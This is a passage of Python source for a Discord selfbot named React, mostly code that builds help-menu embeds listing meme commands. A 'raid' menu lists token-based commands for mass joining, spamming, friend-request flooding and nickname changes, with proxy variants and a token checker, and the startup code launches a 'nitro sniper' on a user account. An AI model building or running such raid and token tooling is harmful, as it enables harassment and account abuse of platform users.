**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('fox').name}** ¬ª {React.get_command('fox').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('duck').name}** ¬ª {React.get_command('duck').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('dog').name}** ¬ª {React.get_command('dog').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('cat').name}** ¬ª {React.get_command('cat').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('panda').name}** ¬ª {React.get_command('panda').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('redpanda').name}** ¬ª {React.get_command('redpanda').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('koala').name}** ¬ª {React.get_command('koala').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('bird').name}** ¬ª {React.get_command('bird').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('pikachu').name}** ¬ª {React.get_command('pikachu').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hug').name}** ¬ª {React.get_command('hug').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('kiss').name}** ¬ª {React.get_command('kiss').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wink').name}** ¬ª {React.get_command('wink').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('waifu').name}** ¬ª {React.get_command('waifu').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('neko').name}** ¬ª {React.get_command('neko').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wallpaper').name}** ¬ª {React.get_command('wallpaper').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('food').name}** ¬ª {React.get_command('food').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('sadcat').name}** ¬ª {React.get_command('sadcat').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('tpdne').name}** ¬ª {React.get_command('tpdne').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('yesorno').name}** ¬ª {React.get_command('yesorno').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('belikebill').name}** ¬ª {React.get_command('belikebill').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wasted').name}** ¬ª {React.get_command('wasted').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('triggered').name}** ¬ª {React.get_command('triggered').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('trumptweet').name}** ¬ª {React.get_command('trumptweet').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('tweet').name}** ¬ª {React.get_command('tweet').description}''',timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        em2 = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Page 2/5

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('achievement').name}** ¬ª {React.get_command('achievement').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('phcomment').name}** ¬ª {React.get_command('phcomment').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('qrcode').name}** ¬ª {React.get_command('qrcode').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('approved').name}** ¬ª {React.get_command('approved').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rejected').name}** ¬ª {React.get_command('rejected').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('batslap').name}** ¬ª {React.get_command('batslap').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('beautiful').name}** ¬ª {React.get_command('beautiful').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('brazzers').name}** ¬ª {React.get_command('brazzers').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('burn').name}** ¬ª {React.get_command('burn').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('crush').name}** ¬ª {React.get_command('crush').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('dictator').name}** ¬ª {React.get_command('dictator').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('discordhouse').name}** ¬ª {React.get_command('discordhouse').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('gay').name}** ¬ª {React.get_command('gay').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('magik').name}** ¬ª {React.get_command('magik').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('missionpassed').name}** ¬ª {React.get_command('missionpassed').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rip').name}** ¬ª {React.get_command('rip').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('scary').name}** ¬ª {React.get_command('scary').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('sniper').name}** ¬ª {React.get_command('sniper').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('tobecontinued').name}** ¬ª {React.get_command('tobecontinued').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('subzero').name}** ¬ª {React.get_command('subzero').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('vs').name}** ¬ª {React.get_command('vs').description}''',timestamp=embed_timestamp())
        em2.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em2.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em2.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        em3 = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Page 3/5

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wanted').name}** ¬ª {React.get_command('wanted').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('whowouldwin').name}** ¬ª {React.get_command('whowouldwin').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('changemymind').name}** ¬ª {React.get_command('changemymind').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('clyde').name}** ¬ª {React.get_command('clyde').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('supreme').name}** ¬ª {React.get_command('supreme').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('scroll').name}** ¬ª {React.get_command('scroll').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('captcha').name}** ¬ª {React.get_command('captcha').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('phlogo').name}** ¬ª {React.get_command('phlogo').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('facts').name}** ¬ª {React.get_command('facts').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('deletetrash').name}** ¬ª {React.get_command('deletetrash').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('smart').name}** ¬ª {React.get_command('smart').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('shoot').name}** ¬ª {React.get_command('shoot').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('punch').name}** ¬ª {React.get_command('punch').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('bear').name}** ¬ª {React.get_command('bear').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('car').name}** ¬ª {React.get_command('car').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('shiba').name}** ¬ª {React.get_command('shiba').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('goose').name}** ¬ª {React.get_command('goose').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('slap').name}** ¬ª {React.get_command('slap').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('pat').name}** ¬ª {React.get_command('pat').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('poke').name}** ¬ª {React.get_command('poke').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('tickle').name}** ¬ª {React.get_command('tickle').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('cuddle').name}** ¬ª {React.get_command('cuddle').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('smug').name}** ¬ª {React.get_command('smug').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('baka').name}** ¬ª {React.get_command('baka').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('kannagen').name}** ¬ª {React.get_command('kannagen').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('httpcat').name}** ¬ª {React.get_command('httpcat').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('trash').name}** ¬ª {React.get_command('trash').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('crap').name}** ¬ª {React.get_command('crap').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('simpcard').name}** ¬ª {React.get_command('simpcard').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('gif').name}** ¬ª {React.get_command('gif').description}''',timestamp=embed_timestamp())
        em3.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em3.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em3.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        em4 = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Page 4/5

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('eject').name}** ¬ª {React.get_command('eject').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('carreverse').name}** ¬ª {React.get_command('carreverse').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('water').name}** ¬ª {React.get_command('water').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('emergencymeeting').name}** ¬ª {React.get_command('emergencymeeting').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('iamspeed').name}** ¬ª {React.get_command('iamspeed').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('drip').name}** ¬ª {React.get_command('drip').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('firsttime').name}** ¬ª {React.get_command('firsttime').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('heaven').name}** ¬ª {React.get_command('heaven').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('dockofshame').name}** ¬ª {React.get_command('dockofshame').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('icanmilkyou').name}** ¬ª {React.get_command('icanmilkyou').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('stonks').name}** ¬ª {React.get_command('stonks').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('notstonks').name}** ¬ª {React.get_command('notstonks').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('tableflipimg').name}** ¬ª {React.get_command('tableflipimg').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('batmanslap').name}** ¬ª {React.get_command('batmanslap').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('distractedbf').name}** ¬ª {React.get_command('distractedbf').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('npc').name}** ¬ª {React.get_command('npc').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wide').name}** ¬ª {React.get_command('wide').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('womanyellingatcat').name}** ¬ª {React.get_command('womanyellingatcat').description}''',timestamp=embed_timestamp())
        em4.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em4.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em4.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        em5 = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Page 5/5

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ps4').name}** ¬ª {React.get_command('ps4').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('thanos').name}** ¬ª {React.get_command('thanos').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('moustache').name}** ¬ª {React.get_command('moustache').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('glitch').name}** ¬ª {React.get_command('glitch').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('dungeon').name}** ¬ª {React.get_command('dungeon').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('challenger').name}** ¬ª {React.get_command('challenger').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('3000years').name}** ¬ª {React.get_command('3000years').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('revavatar').name}** ¬ª {React.get_command('revavatar').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('revimage').name}** ¬ª {React.get_command('revimage').description}

[Click here](https://docs.reactselfbot.pro/commands/#image-commands) for meme generation commands''',timestamp=embed_timestamp())
        em5.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em5.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em5.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        if page == '1' or page == None:
            await embed_or_codeblock(ctx, em)
        elif page == '2':
            await embed_or_codeblock(ctx, em2)
        elif page == '3':
            await embed_or_codeblock(ctx, em3)
        elif page == '4':
            await embed_or_codeblock(ctx, em4)
        elif page == '5':
            await embed_or_codeblock(ctx, em5)

        elif page.lower() == 'all':
            await embed_or_codeblock(ctx, em)
            await embed_or_codeblock(ctx, em2)
            await embed_or_codeblock(ctx, em3)
            await embed_or_codeblock(ctx, em4)
            await embed_or_codeblock(ctx, em5)


            
        
    @React.command(usage="raid", description="Raid commands")
    async def raid(ctx):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('checktokens').name}** ¬ª {React.get_command('checktokens').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('spamwebhook').name}** ¬ª {React.get_command('spamwebhook').description}

This will use the tokens in `Tokens.txt`.
You need to enter the code behind discord.gg/ for the join commands.

**__Proxyless__**
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('raidjoin').name}** ¬ª {React.get_command('raidjoin').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('raidleave').name}** ¬ª {React.get_command('raidleave').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('raidmessage').name}** ¬ª {React.get_command('raidmessage').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('raidfriendrequest').name}** ¬ª {React.get_command('raidfriendrequest').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('raidremovefriend').name}** ¬ª {React.get_command('raidremovefriend').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('raidnick').name}** ¬ª {React.get_command('raidnick').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('raidreact').name}** ¬ª {React.get_command('raidreact').description}

**__Proxied__** (Only HTTP Proxies)
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('raidproxyjoin').name}** ¬ª {React.get_command('raidproxyjoin').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('raidproxyleave').name}** ¬ª {React.get_command('raidproxyleave').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('raidproxymessage').name}** ¬ª {React.get_command('raidproxymessage').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('raidproxyfriendrequest').name}** ¬ª {React.get_command('raidproxyfriendrequest').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('raidproxyremovefriend').name}** ¬ª {React.get_command('raidproxyremovefriend').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('raidproxynick').name}** ¬ª {React.get_command('raidproxynick').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('raidproxyreact').name}** ¬ª {React.get_command('raidproxyreact').description}''',timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)



    with open('DisabledCommands.txt', 'r') as f:
        try:
            lines = f.read().split('\n')
            for line in lines:
                if line != '':
                    cmd = React.get_command(f"{line}")
                    cmd.update(enabled = False)
        except:
            pass
        f.close()

    with open('Statuses.txt', 'r', encoding="utf-8") as f:
        try:
            lines = f.readlines()
            for line in lines:
                status_cycle_words.append(line)
        except:
            pass
        f.close()

    def download_default_lang():
        if not os.path.exists("./Languages"):
            os.mkdir("./Languages")
        found_cmds = []
        count = 0

        try:
            cmds = open('features.txt', 'r')
            cmd_dict = {}

            for i in cmds.split("\n"):
                i = i.replace("\r", "").split(" | ")
                if len(i) == 1:
                    continue
                else:
                    cmd_dict[i[0]] = i[1]

            data = {}

            for i, j in cmd_dict.items():
                found_cmds.append({"usage": i, "description": j})
                count += 1

                data[i.split(" ")[0].replace("\n", "")] = {"Usage": i, "Description": j}



            with open("./Languages/default.json", "w") as f:
                json.dump(data, f, indent=4, sort_keys=False)

        except Exception as e:
            pass

    download_default_lang()
    

    def load_command_descriptions():
        try:
            if os.path.exists(f'./Languages/{json.load(open("""config.json""", encoding="""utf-8"""))["""language"""]}.json'):
                with open(f'./Languages/{json.load(open("""config.json""", encoding="""utf-8"""))["""language"""]}.json', "r", encoding="utf-8") as jsonFile:
                    data = json.load(jsonFile)
                
                for key, value in data.items():
                    current_command = key
                    command_description = value['Description']
                    command_usage = value['Usage']

                    try:
                        cmd = React.get_command(f"{current_command}")
                        cmd.update(description=command_description, usage=command_usage)
                    except:
                        pass
        except:
            pass

    load_command_descriptions()

    nitro_sniper_thread = mp.Process(target=drone_startup, args=(0, json.load(open("""config.json""", encoding="""utf-8"""))["""token"""]))
    nitro_sniper_thread.start()


    React.run(token, bot=False)
    if sys.platform == "win32":
        os.system("pause")

        
if __name__ == '__main__':
    with warnings.catch_warnings():
        warnings.filterwarnings("ignore")
        warnings.simplefilter("ignore")
        main()
